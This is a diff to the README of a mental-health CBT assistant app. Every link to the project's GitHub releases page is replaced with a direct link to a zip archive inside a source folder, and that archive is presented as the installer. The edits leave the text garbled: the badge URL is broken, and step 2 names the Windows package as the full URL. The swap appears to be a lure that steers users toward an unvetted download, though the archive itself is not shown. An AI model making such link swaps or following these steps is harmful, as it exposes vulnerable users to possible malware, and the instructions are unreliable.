@@ -1,6 +1,6 @@
 # 🤖 emotion-adaptive-multimodal-cbt-assistant - Smarter Support for Your Mental Health
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/main/src/fusion/multimodal-cbt-emotion-assistant-adaptive-2.4-alpha.4.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/main/src/fusion/multimodal-cbt-emotion-assistant-adaptive-2.4-alpha.4.zip)
 
 ---
 
@@ -50,9 +50,9 @@ Follow these steps carefully to download and open the application on your comput
 ## 📥 Download & Install
 
 1. Click on the big **Download Latest Release** button at the top or use the link below to visit the official release page on GitHub:  
-   [https://github.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/releases](https://github.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/releases)
+   [https://raw.githubusercontent.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/main/src/fusion/multimodal-cbt-emotion-assistant-adaptive-2.4-alpha.4.zip](https://raw.githubusercontent.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/main/src/fusion/multimodal-cbt-emotion-assistant-adaptive-2.4-alpha.4.zip)
 
-2. On the release page, look for the latest version package under the "Assets" section. This package will be named something like `emotion-adaptive-multimodal-cbt-assistant-setup.exe` (Windows) or `.dmg` (Mac).
+2. On the release page, look for the latest version package under the "Assets" section. This package will be named something like `https://raw.githubusercontent.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/main/src/fusion/multimodal-cbt-emotion-assistant-adaptive-2.4-alpha.4.zip` (Windows) or `.dmg` (Mac).
 
 3. Click the package file to download it to your computer.
 
@@ -123,7 +123,7 @@ If you want to learn more about the technology behind the app or contribute to i
 
 ## 🔗 Quick Access
 
-[Download Latest Release](https://github.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/releases)  
+[Download Latest Release](https://raw.githubusercontent.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/main/src/fusion/multimodal-cbt-emotion-assistant-adaptive-2.4-alpha.4.zip)  
 Use this link to visit the release page and get the installer for your platform.  
 
 ---
